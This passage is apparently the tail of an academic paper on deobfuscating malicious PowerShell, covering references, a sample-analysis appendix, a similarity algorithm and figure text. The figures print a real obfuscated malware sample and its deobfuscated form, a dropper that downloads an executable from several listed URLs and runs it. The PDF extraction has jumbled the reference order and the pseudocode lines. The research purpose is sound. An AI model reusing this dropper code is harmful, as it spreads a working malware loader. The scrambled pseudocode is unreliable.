center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf
[22] Mihai Christodorescu, Somesh Jha, Sanjit A Seshia, Dawn Song, and Randal E
Bryant. 2005. Semantics-aware malware detection. In 2005 IEEE Symposium on
Security and Privacy (S&P’05). IEEE, 32–46.
[23] Kevin Coogan, Saumya Debray, Tasneem Kaochar, and Gregg Townsend. 2009.
Automatic static unpacking of malware binaries. In 2009 16th Working Conference
on Reverse Engineering. IEEE, 167–176.
[24] Kevin Coogan, Gen Lu, and Saumya Debray. 2011. Deobfuscation of virtualization-
obfuscated software: a semantics-based approach. In Proceedings of the 18th ACM
conference on Computer and communications security. ACM, 275–284.
[25] Marco Cova, Christopher Kruegel, and Giovanni Vigna. 2010. Detection and anal-
ysis of drive-by-download attacks and malicious JavaScript code. In Proceedings
of the 19th international conference on World wide web. ACM, 281–290.
[26] Charlie Curtsinger, Benjamin Livshits, Benjamin G Zorn, and Christian Seifert.
2011. ZOZZLE: Fast and Precise In-Browser JavaScript Malware Detection.. In
USENIX Security Symposium. San Francisco, 33–48.
[27] Artem Dinaburg, Paul Royal, Monirul Sharif, and Wenke Lee. 2008. Ether: mal-
ware analysis via hardware virtualization extensions. In Proceedings of the 15th
ACM conference on Computer and communications security. ACM, 51–62.
[28] Matt Fredrikson, Somesh Jha, Mihai Christodorescu, Reiner Sailer, and Xifeng
Yan. 2010. Synthesizing near-optimal malware specifications from suspicious
behaviors. In 2010 IEEE Symposium on Security and Privacy. IEEE, 45–60.
[53] Gili Rusak, Abdullah Al-Dujaili, and Una-May O’Reilly. 2018. AST-Based Deep
Learning for Detecting Malicious PowerShell. arXiv:1810.09230 [cs, stat] (Oct.
2018). https://doi.org/10.1145/3243734.3278496 arXiv: 1810.09230.
[54] Samratashok. 2018. samratashok/nishang: Nishang - Offensive PowerShell for red
team, penetration testing and offensive security. Retrieved May 10, 2019 from
https://github.com/samratashok/nishang
[55] Robert Diggs says. 2017. Pulling Back the Curtains on EncodedCommand Power-
Shell Attacks. Retrieved May 10, 2019 from https://unit42.paloaltonetworks.com/
unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/
[56] Monirul Sharif, Andrea Lanzi, Jonathon Giffin, and Wenke Lee. 2009. Automatic
reverse engineering of malware emulators. In 2009 30th IEEE Symposium on
Security and Privacy. IEEE, 94–109.
[57] Monirul I Sharif, Andrea Lanzi, Jonathon T Giffin, and Wenke Lee. 2008. Impeding
Malware Analysis Using Conditional Code Obfuscation.. In NDSS.
[58] Li Sun, Steven Versteeg, Serdar Boztaş, and Trevor Yann. 2010. Pattern recognition
techniques for the classification of malware packers. In Australasian Conference
on Information Security and Privacy. Springer, 370–390.
[59] Symantec. 2018. Security Center White Papers | Symantec. https://www.symantec.
com/security-center/white-papers
[60] Weltner Tobias. 2018. New Obfuscation Modes. Retrieved May 10, 2019 from
http://www.powertheshell.com/obfuscationmode/
[61] Xabier Ugarte-Pedrero, Davide Balzarotti, Igor Santos, and Pablo G Bringas. 2015.
SoK: Deep packer inspection: A longitudinal study of the complexity of run-time
packers. In 2015 IEEE Symposium on Security and Privacy. IEEE, 659–673.
[62] Xabier Ugarte-Pedrero, Igor Santos, and Pablo G Bringas. 2011. Structural feature
based anomaly detection for packed executable identification. In Computational
intelligence in security for information systems. Springer, 230–237.
[63] Xabier Ugarte-Pedrero, Igor Santos, Iván García-Ferreira, Sergio Huerta, Borja
Sanz, and Pablo G Bringas. 2014. On the adoption of anomaly detection for
packed executable filtering. Computers & Security 43 (2014), 126–144.
[64] Candid Wueest and Himanshu Anand. 2017.
and fileless attack techniques.
//www.symantec.com/content/dam/symantec/docs/security-center/white-
papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf
ISTR Living off the land
Retrieved May 10, 2019 from https:
[65] Candid Wueest and Doherty Stephen. 2016. The Increased Use of PowerShell
in Attacks. https://www.symantec.com/content/dam/symantec/docs/security-
center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf
[66] Wei Xu, Fangfang Zhang, and Sencun Zhu. 2012. The power of obfuscation
techniques in malicious JavaScript code: A measurement study. In 2012 7th Inter-
national Conference on Malicious and Unwanted Software. IEEE, 9–16.
[67] Babak Yadegari, Brian Johannesmeyer, Ben Whitely, and Saumya Debray. 2015.
A generic approach to automatic deobfuscation of executable code. In 2015 IEEE
Symposium on Security and Privacy. IEEE, 674–691.
[68] Yanfang Ye, Dingding Wang, Tao Li, Dongyi Ye, and Qingshan Jiang. 2008. An
intelligent PE-malware detection system based on association mining. Journal in
computer virology 4, 4 (2008), 323–334.
[69] Qiang Zeng, Lannan Luo, Zhiyun Qian, Xiaojiang Du, and Zhoujun Li. 2018.
Resilient decentralized Android application repackaging detection using logic
bombs. In Proceedings of the 2018 International Symposium on Code Generation
and Optimization. ACM, 50–61.
[70] Tong Zhang. 2004. Solving large scale linear prediction problems using stochas-
tic gradient descent algorithms. In Proceedings of the twenty-first international
conference on Machine learning. ACM, 116.
[29] Ekta Gandotra, Divya Bansal, and Sanjeev Sofat. 2014. Malware analysis and
classification: A survey. Journal of Information Security 5, 02 (2014), 56.
[30] Rick Cole Geoff Ackerman. 2018.
OVERRULED: Containing a Po-
tentially Destructive Adversary.
Retrieved May 10, 2019 from
https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-
a-potentially-destructive-adversary.html
[31] HemantMahawar. 2019. Script Tracing and Logging. Retrieved May 10, 2019
from https://docs.microsoft.com/en-us/powershell/wmf/5.0/audit_script
[32] Danny Hendler, Shay Kels, and Amir Rubin. 2018. Detecting Malicious PowerShell
Commands Using Deep Neural Networks. In Proceedings of the 2018 on Asia
Conference on Computer and Communications Security (ASIACCS ’18). ACM, New
York, NY, USA, 187–197. https://doi.org/10.1145/3196494.3196511
[33] Ahl Ian. 2017. Privileges and Credentials: Phished at the Request of Counsel Âń
Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 10,
2019 from https://www.fireeye.com/blog/threat-research/2017/06/phished-at-
the-request-of-counsel.html
[34] Guhyeon Jeong, Euijin Choo, Joosuk Lee, Munkhbayar Bat-Erdene, and Heejo
Lee. 2010. Generic unpacking using entropy analysis. In 2010 5th International
Conference on Malicious and Unwanted Software. IEEE, 98–105.
[35] Mehran Jodavi, Mahdi Abadi, and Elham Parhizkar. 2015. JSObfusDetector: A
binary PSO-based one-class classifier ensemble to detect obfuscated JavaScript
code. In 2015 The International Symposium on Artificial Intelligence and Signal
Processing (AISP). IEEE, Mashhad, Iran, 322–327. https://doi.org/10.1109/AISP.
2015.7123508
[36] joeyaiello. 2019. PowerShell Scripting. Retrieved May 10, 2019 from https:
//docs.microsoft.com/en-us/powershell/scripting/overview
[37] Min Gyung Kang, Pongsin Poosankam, and Heng Yin. 2007. Renovo: A hidden
code extractor for packed executables. In Proceedings of the 2007 ACM workshop
on Recurring malcode. ACM, 46–53.
[38] Scott Kaplan, Benjamin Livshits, Benjamin Zorn, Christian Siefert, and Charlie
Curtsinger. 2011. " NOFUS: Automatically Detecting"+ String. fromCharCode
(32)+" ObFuSCateD". toLowerCase ()+" JavaScript Code. Technical report, Technical
Report MSR-TR 2011–57, Microsoft Research (2011).
[39] Rainer Koschke, Raimar Falke, and Pierre Frenzel. 2006. Clone Detection Using
Abstract Syntax Suffix Trees. In 2006 13th Working Conference on Reverse Engi-
neering. IEEE, Benevento, Italy, 253–262. https://doi.org/10.1109/WCRE.2006.18
[40] Rainer Koschke, Raimar Falke, and Pierre Frenzel. 2006. Clone detection using ab-
stract syntax suffix trees. In 2006 13th Working Conference on Reverse Engineering.
IEEE, 253–262.
[41] Chao Liu, Bin Xia, Min Yu, and Yunzheng Liu. 2018. PSDEM: A Feasible De-
Obfuscation Method for Malicious PowerShell Detection. In 2018 IEEE Symposium
on Computers and Communications (ISCC). IEEE, Natal, 00825–00831. https:
//doi.org/10.1109/ISCC.2018.8538691
[42] Gen Lu and Saumya Debray. 2012. Automatic simplification of obfuscated
JavaScript code: A semantics-based approach. In 2012 IEEE Sixth International
Conference on Software Security and Reliability. IEEE, 31–40.
[43] Viral Maniar. 2019. Python based backdoor that uses Gmail to exfiltrate data
through attachment. This RAT will help during red team engagements to backdoor
any Windows machines. It tracks the user activity using scree.. https://github.com/
Viralmaniar/Powershell-RAT original-date: 2018-03-15T01:51:08Z.
[44] Lorenzo Martignoni, Mihai Christodorescu, and Somesh Jha. 2007. Omniunpack:
Fast, generic, and safe unpacking of malware. In Twenty-Third Annual Computer
Security Applications Conference (ACSAC 2007). IEEE, 431–441.
[45] Kersten Max. 2019. Emotet droppers. Retrieved May 8, 2019 from https://
maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/
[46] Mr Md Rehaman Pasha, Mrs Y Prathima, and Mr L Thirupati. 2014. Malwise
System for Packed and Polymorphic Malware. vol 3 (2014), 167–172.
[47] Roberto Perdisci, Andrea Lanzi, and Wenke Lee. 2008. Classification of packed
executables for accurate computer virus detection. Pattern recognition letters 29,
14 (2008), 1941–1946.
[48] R3MRUM. 2019. PowerShell script for deobfuscating encoded PowerShell scripts:
R3MRUM/PSDecode. https://github.com/R3MRUM/PSDecode original-date: 2017-
12-11T02:27:42Z.
[49] Jithu Raphel and P Vinod. 2015. Information theoretic method for classification
of packed and encoded files. In Proceedings of the 8th International Conference on
Security of Information and Networks. ACM, 296–303.
[50] Dhavleesh Rattan, Rajesh Bhatia, and Maninder Singh. 2013. Software clone
detection: A systematic review. Information and Software Technology 55, 7 (2013),
1165–1199.
[51] Konrad Rieck, Tammo Krueger, and Andreas Dewald. 2010. Cujo: efficient de-
tection and prevention of drive-by-download attacks. In Proceedings of the 26th
Annual Computer Security Applications Conference. ACM, 31–39.
[52] Paul Royal, Mitch Halpin, David Dagon, Robert Edmonds, and Wenke Lee. 2006.
Polyunpack: Automating the hidden-code extraction of unpack-executing mal-
ware. In 2006 22nd Annual Computer Security Applications Conference (ACSAC’06).
IEEE, 289–300.
B REAL-WORLD SAMPLE ANALYSIS
The following is a real-world malicious PowerShell script [2], which
is obfuscated with two different methods. Figure 10 is the obfus-
cated malware sample. Figure 11 shows the intermediate results of
deobfuscating one layer of obfuscation. Figure 12 is the final result.
We also deobfuscate another more complex example [6], which
is obfuscated 6 layers sequentially, and successfully get the original
script with our approach.
Specifically, the first layer is a script-block level obfuscation with
base64 encoding, the second layer is a script-block level obfuscation
with hex encoding, the third layer is a script-block level obfuscation
with binary encoding, and the last three layers are all token level
obfuscations with string manipulation.
C AN EXAMPLE OF MIXED SCRIPTS
Figure 13 is an example of the mixed scripts we constructed.
A PSEUDO CODE USED TO CALCULATE THE
SIMILARITY
The pseudo code 1 shows the algorithm used to calculate the simi-
larity between the deobufscated scripts and the original scripts.
nl := QL[0]
Let tl be the subtree root as tl
Let l be the count of nodes in the tl
Serialize the tl to an array al with Pre-order traverse
while QR is not empty do
Algorithm 1 Calculate the similarity between two scripts
Input: AST for the script a TL; AST for the script b TR
Output: Similarity Similarity
1: Let L be the count of nodes in TL
2: Let R be the count of nodes in TR
3: S := 0
4: Breadth-first traverse the TL and put nodes into a queue QL
5: Breadth-first traverse the TR and put nodes into a queue QR
6: while QL is not empty do
7:
8:
9:
10:
11:
12:
13:
14:
15:
16:
17:
18:
19:
20:
21:
22:
23:
24:
25:
26:
27:
28: end while
29: Similarity := 2 × S/(2 × S + L + R)
30: Output Similarity
nr := QR[0]
Let tr be the subtree root as tr
Let r be the count of nodes in the tr
Serialize the tr to an array ar with Pre-order traverse
Let as be the longest sub sequence between al and ar
Let s be the length of as
n := 2 × s/(2 × s + l + r)
if n > 0.7 then
S := S + s
Remove nl and all its ancestor nodes from QL
Remove nr and all its ancestor nodes from QR
else
Continue
end if
end while
Remove nl from QL
Figure 10: An Obfuscated malware sample
powershell "([RUNTiME.iNTeRopsErViCeS.mArShal]::PTRTOstRiNGuNi([rUnTime.IntErOPSERvIceS.maRsHal]::sECUResTriNGTOgLOBAlAlLOCUNIcoDe($('76492d1116743f0423413b16050a5345MgB8AFgAMgBBAGoAdwB2ADUAdgBzAEMAYwBlADkASwBMAFAAaAB1AEsANwB4AEEAPQA9AHwAYQBkADAAMwA0AGUAOQBiAGMAZABjADUAOABhAGMAYgAzADgANQA4ADMAOQBiAGQAYQAyADEAMwA2ADIAZgA3ADgAMwBlADUAZAAzADkANwBlAGUAMABkADcAZQA1AGEAOQBhADYAMQBlADEAMABlAGIAZABmADkAMQBkADEAYwAwAGQAMgA3ADcANwAyADAAOQA4AGMAYwA3ADYANABmADUANQAxADQAYgA1AGUAYgA3AGIAZQAxADcANgA3ADgAYwA1ADIANwA5ADMAMgBiAGEAZQA2ADEANAA1AGYAYwAyAGUAZgBkAGEAZgAyADgAMABlAGUAZgAzADIANABkADQANgA3AGQAMgBkADcAZgBmADEAZABkAGIAYgA1AGUANwBkAGUANAA1ADEAOAA4ADMANQAxAGUAMQA5AGUANgBhAGUANwA0ADkAMQA4ADMAZgAwADIANwBiADEAZAAwADkANAAxAGEAYwA4AGEAOQBlADAANgA4AGEAYgA2AGMAMgA1AGYANQA5ADQAOQAzADgAYgA1AGIANgA3ADIANwA1ADUANgA4ADEAYgBlADMANgA3AGQAYgBmAGEAZQBlADYAZgAwAGUAMgA5ADcAZQBlADAAZQBmAGYAZQBlADMAYgAzAGUAOAA2ADgAMQBiAGIAMQBlAGMANwA5ADAAYwBjADMAMwAxADUANwA0AGEAYQBkADAAYgA4ADUANwBkADMANwA5ADYAYQBmADgAMgBlADgAZQA4ADUAYwAwAGYAZQBmADIAMQBkADEAZQAxADQAMQA0AGYAYgA3ADUAMQA2ADgAMAAyAGEANAAzAGQAYQBkAGIAMABkADgANAA1ADYANQA3ADQANwBhADAAZQA4ADgAOQBjADQANgAyADkAZQAyAGYAZQA4ADcAOAA0ADgANwA3ADkAMwA4ADcAZQA0ADEAZAAzAGQAZQA0ADcANgA1ADEANwBiAGYAMgAxADYAMQA1ADUAMQAzAGUAYgA4ADAAMgA1ADgAOAAzADgAZQBkAGQAZgBhADIAMAA2ADMANAAwADgAZAAxADIAMwA0AGIAOQBlAGIAZQAyADcAOQA1AGMAMwBiADQAMQBlAGQAMgBjADYAMwA0ADkAOQAyAGMAMwBlADcAYQBhAGUAYQA4AGIAZgAwADMANwAyADMAYQA2ADMAZgA1AGMANQBjADcAMQA1AGEANQA1ADMANgBiAGEAZQBmAGYAMwA5ADQAMwBmADMAZgBjADMAMwBlAGIAYgBjADMAYgA2ADUAYgA2ADIAYQA2AGIAMAA3ADIANQA1AGMAYwA0AGEANAA0AGYAMgAyAGYANwAxAGUAMQBiADEAYgBiADMAMgAxADQAMAAyADcAOAAxADEANQBhAGIANwBhADAAMABhADcAZgA0ADkANwAwADAAOABmAGYAMwA3ADkAMwBlADgAOQA3ADYAYQAxADIAOQAwADMANwAwAGUAOQA0AGIAYwBhAGQAMwA3AGEAOQA0AGEAYwA2ADYAOABkAGYAMABiADMAYgBiAGMAZQA4ADIAMwAxAGQAYwBhAGQAYgA4ADQAMABlADAAYwA3ADkAYgBjADcAYgBjADcAOQA5ADYAYQAzAGYAZgA3ADUAZABkAGEAYQA0ADUAZgA1ADAAOQA1AGUAOAA4ADYAMABjAGIANgA1AGQAYgAwAGMAZgBjADMAZABhADkAOAA1ADYANwBhADQAMwBhADIAYwBhADEAMwA5AGEAMAAzADAANAA3AGIAOQBmAGMAZAA2ADgANwBlAGMAMAAzADAAZAA4ADQAMwAwAGEAZQA5ADQANgBhADcANAAxAGYAMABmADYAOAAwADMAOABlAGUAYQA3ADUANABjADgAMwAwADgANAAzAGYAMQBiADAAOQA4AGQAZABlAGYAZgAwADYANAAyADAANwA4ADMAMgAzAGQAZQAyADMAZQAwADMAMABkAGEAYQA4AGIANQA5ADMAMAAzADkAOQA3ADgANAAwADIANABlADgANAA5ADYAYwA3ADcAMAAwADEAYwAwADYAYgA1AGIANQBiADcAYQA5ADUAOAAxADcAOQA5ADAANwAzADUANgBkADgAZAA3AGQAMwAyAGEAYQBlADYANQBmADgAMgA1ADEAMABjAGQAZgBlADcAYwBmAGEAZQAxAGYAZgBkAGEAZQAwADAAMgA2AGIAZgA0ADEAOAA4ADQAYQBlAGQAZQA5AGMAOQAwADcAMgBkADUAZgA2AGEAMQA3ADEAMQBiAGEAYgBjAGIAZgBhADgAYwAyADcANwBiADMAYQA5ADAAYgA5ADcANgA1ADAAZgA2ADMAMgAwAGQAYgAzAGMAYwA4ADIAZgA2AGQAMQBjADgAMwBmADQAYQAxADYAMgBkADEANgA0ADAAMQBmADIAZgBkADMAYQBlAGIAOQBmAGYAZAAwADQAMwA4AGYANwBhAGMAMgBiADIAZQA1AGMAZQA5AGUAMgBlADUAMQA4ADcAOAA3ADYAYgBiAGEAOAA0ADMAZgAxADcANwA3ADYANABjAGQAYwBlADAAMQAyADQAYwBhAGQANgBiAGIAYQAzADUANgA3ADYAZQBiAGIAYgBiAGUANQBlAGQAYwA2AGMANgBhAGIANgAwAGEANQA5ADUAMQBlADUAMQA0ADQAMQBjADcAZABmADEAMgA3ADEAYwBkADUAZgBkADYAZAA0ADMAOAA1ADUAZQA0AGQAYQA0ADQAZABlAGYANAA0ADMANgA1ADkAMgAwADUAYwBjADMAMgBkADUAYwA2ADcAYQA1ADQAZQA3AGIAZAAyAGEAOQA2ADcANwAwADkANABhAGUANQBkAGUANwAxAGIAZABiADEAYQA2AGMANwAzAGEAZQA5ADEANwA1AGYAYQA1ADYAOAA3AGIAMgBhAGIAZQAyADgAYwA1ADEAZAAzADMAMQBmADEAMQAxADcAOAA4AGYAZAA3ADAANgAyAGUAZgAwADEAYwBmAGQAMQBlADUAMgBjADcANgBkAGEAMgA0ADYAMwAzAGIAMwA5AGMAMQA0ADUAYgA1AGMAZgBiAGYAOAA1AGEANwBkADgAMAAxADAAMwAzAGUAMwAxADIAZgAxAGIANAA3AGIAYwBlADUAMgAwADYAMgA1AGIAYwBlAGMAMwAwAGUANABlADkAMAAyAGYAOAA3ADEANQAxADMAMABhADAAMAA5ADkAYgA1ADQAZQBlAGYANQBjADgAMQBjAGQAMgA2AGQANQA2ADkAZAAyAGEAZgAxADUAYgA5AGYAOABkADQANQBmADAAZQA0ADkAZQA3ADYAYQA2ADAAZAA2ADQAMAA3AGYANwBiADkAMwA2ADkAZgBiADkAYQAxADEAZgA0ADYANAAwAGEAYgBkAGIAYQBjADQAYQBiAGMAYQA4ADIAOAA2AGQAOQBlAGIANQA2AGMAMQA0ADYAZgBiAGQAZABjAGIAYwA2ADIAZAA4ADkAZQBmADYAZgA3AGMAYgAzADcAYgA0ADgANwA5AGIAMwA0AGUAMAAzADQAMgA5ADQAZgAyAGQAZQA3AGQAMQA1ADMAYgBkADIANAA1AGEANgA0AGEANwBlADEAZAAyAGMAZgBhADkAOQBlADUAMgA2ADAAMAA4AGEANgA4ADQAZgA3ADYAOQBlADUAMgBiADYANgA2AGQAYQAwADMANgBkAGMAZQBjAGMAMgBhAGQAMgAwAGQAYgBhAGUANAAwADcANAA4AGYAZAA4AGYANAA0ADkAYQBlADEANwBiAGYAMgBlADMAYgA2ADMAZgA1ADIAYwAxADkANQA5AGYAOQBjAGUAYgA0ADEANQA0AGIANQBhADUANQBjAGUAOQBlADMANABmADEAYwAyADEANQAxADQANQA4ADgAOAAyADkANAA3AGUANwBhADQAMgA5ADAANQBhAGIANQAwADIAZgAxAGYAZABlAGYAYgA4ADcAYwAyADMAYwA1AGUAYQA4AGIANABkAGMANwBlADIAMwA2AGMAMwBmAGQAYwAzAGEAZgA5AGQAYQAwADMAOQAxAGQAMQBiADgAZAA2ADYAZAA3AGMAMABiADAAMgA1ADYAOABiADYAZQAzADcAMAAzAGUAZAA5ADkAYQA3ADQAZgBjADMANABiAGMAMQA0ADcANABiADMAYgBjADQAMwAxAGYANwBiAGUANgA5ADEANwAxADAANAAwAGEAMgAwADEAOQA1AGMANABkADAAMAAwAGEAMQA3AGUANwBjADgANwAzADcAZAA1ADAAMgBjAGIAOQBjADEAZQBkADYAYgBmAGEAMgBlAGYANABiADIAMgA1ADMAMQBhADAAYQBkADcAMAAxADcAMgA1ADgAOQA1ADAAZAA0AGEANQAxAGYAMQAwADIAMAA3AGMAZgA1AGYAMgA1AGYAYQAxAGYAZgA3ADEAMQBjADEAMwAzADkAZQBhADEAYgA4ADUANgA1ADAAMAAzAGEAMQBiADEAYgA0ADUAYQAzAGIAMgA2ADEANwA4ADgAOQA4ADMANwA4ADUAMwA4AGYAMAAwADMAZABkAGEAZAA5ADcAZQBiADYANAAzADkAOQA2ADIAYQBmADYAOQBjAGIAZQA5AGYANQA1ADMAZAA5AGMANwBmAGMAZQBiAGIANQAwADAAMABlADYAOQBmADkANwA3ADQAZABjADgAMABjADcAZAA2ADcAZAA4ADEAYgA1AGIANgBkADYAYgBiADAAZgA1ADQAMgBmADEAMgA2AGMAYQBjADQAYwBlAGYANgA0AGUAMAA3AGEAMAAyAGEAOAA2ADYAMwA0ADkANQBmADkAYgBlAGEAYwBjADgAMgA5ADIAZgAxADYAZgA1ADYAOQBkAGQAMAA2AGMANwA4AGYANQA2AGQAMgAyADEAYgA3ADkAMgA1AGUAZQAyAGUANABkADEAMgBkAGUANgBlAGQANAA4AGIANQA1ADQANwA5ADQAZQBhAGIANAAxAGEANgBmADYAZgBmADgAYQAzADIAMwAzAGYAYQA5ADkANwA2ADIANwA5ADEAMwA0AGQAYwBmAGMAOQAyADIANABkADUAYwA1AGQANAAyAGEANwBlADAANAA5ADUANwA1ADMAZgAwAGYAZgBjAGMAOQA3ADcAMAA4AGIAMwA1ADQAMgA3AGMAZAA1ADQANAAzADAANwAwAGIAMgAwADQAYgA4AGYAMQA4ADAAZgAyAGYAZABkADEANwBhADAANwBjADYANwAxADAANgA='| cOnVertTO-SEcUrEStrinG -KE196,148,187,123,187,195,213,254,9,250,232,193,112,146,83,172,255,41,240,23,34,95,215,17,226,111,128,53,126,193,106,149)) ))| .( $Env:cOMSpeC[4,24,25]-JOIn'')Figure 11: An intermediate deobfuscating result (removed the first layer of obfuscation)
Figure 12: The deobfuscated malware sample with our subtree-based deobfuscation approach
Figure 13: An example of mixed scripts
$nsadasd = &('n'+'e'+'w-objec'+'t') random;$YYU = .('ne'+'w'+'-object') System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = 'http://quote.freakget.com/wpcontent/rCk5/@http://www.lightchasers.in/Mwmg/@http://casastoneworks.com.au/9ARR4/@http://jasclair.com/scI8YTL/@http://convivialevent.fr/IoVWm/'.Split('@');$SDC = $env:public + '\' + $NSB + ('.ex'+'e');foreach($asfc in $ADCX){try{$YYU."Do`Wnl`OadFI`le"($asfc."ToStr`i`Ng"(), $SDC);&('Invo'+'k'+'e-Item')($SDC);break;}catch{}}$nsadasd = new-object random;$YYU = new-object System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = 'http://quote.freakget.com/wpcontent/rCk5/@http://www.lightchasers.in/Mwmg/@http://casastoneworks.com.au/9ARR4/@http://jasclair.com/scI8YTL/@http://convivialevent.fr/IoVWm/'.Split('@');$SDC = "C:\User\Public\89955.exe";foreach($asfc in $ADCX){try{$YYU.DoWnlOadFIle($asfc.ToStriNg(), $SDC);Invoke-Item ($SDC);break;}catch{}}$nsadasd = new-object random;$YYU = new-object System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$MountShare = $True$ADCX = 'http://quote.freakget.com/wpcontent/rCk5/@http://www.lightchasers.in/Mwmg/@http://casastoneworks.com.au/9ARR4/@http://jasclair.com/scI8YTL/@http://convivialevent.fr/IoVWm/'.Split('@');$SDC = "C:\User\Public\89955.exe";foreach($asfc in $ADCX){ try {$YYU.DoWnlOadFIle($asfc.ToStriNg(), $SDC);Invoke-Item ($SDC);break; }catch{} }$SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force$Credential =  New-Object System.Management.Automation.PSCredential($UserName, $SecurePassword)$commonArgs['Credential'] = $Credential$SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force$Credential =  New-Object System.Management.Automation.PSCredential($UserName, $SecurePassword)$commonArgs['Credential'] = $Credential